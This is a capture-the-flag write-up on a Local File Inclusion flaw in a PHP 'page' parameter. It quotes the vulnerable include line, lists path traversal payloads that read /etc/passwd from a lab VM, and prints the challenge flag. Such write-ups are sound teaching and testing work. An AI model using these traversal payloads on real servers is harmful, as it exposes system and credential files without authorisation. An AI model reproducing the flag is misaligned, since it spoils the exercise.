# Include — Writeup

**Flag:** `b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0`

## Mechanism

The site builds page content from the `page` parameter in the URL (`index.php?page=...`). The value is passed into a file-loading function without any sanitization or whitelist, something like:

```php
include("pages/" . $_GET['page'] . ".php");
```

Because the value is unchecked, we can inject `../` sequences to climb out of `pages/` and point at any file on disk. This is a **Local File Inclusion (LFI)**: the server includes and prints an arbitrary file it has read access to.

## Reproduction

Each step returns a different server response, which is how we know the value is treated as a file path, not a label:

```
?page=doesnotexist123           -> "Wtf?"        (dynamic handling confirmed)
?page=../../../etc/passwd        -> "Still nope.." (path understood, too shallow)
?page=../../../../etc/passwd     -> "Almost."      (getting close)
?page=../../../../../../etc/passwd  -> prints /etc/passwd + the flag
```

Final URL:

```
http://<IP>/?page=../../../../../../etc/passwd
```

The server outputs the contents of `/etc/passwd` and `Congratulaton!! The flag is: b12c4b2c...`.

## Flag comparison

Flag obtained on the VM:

```
b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
```

Compared byte-for-byte with the `flag` file in the submission folder during the defense.
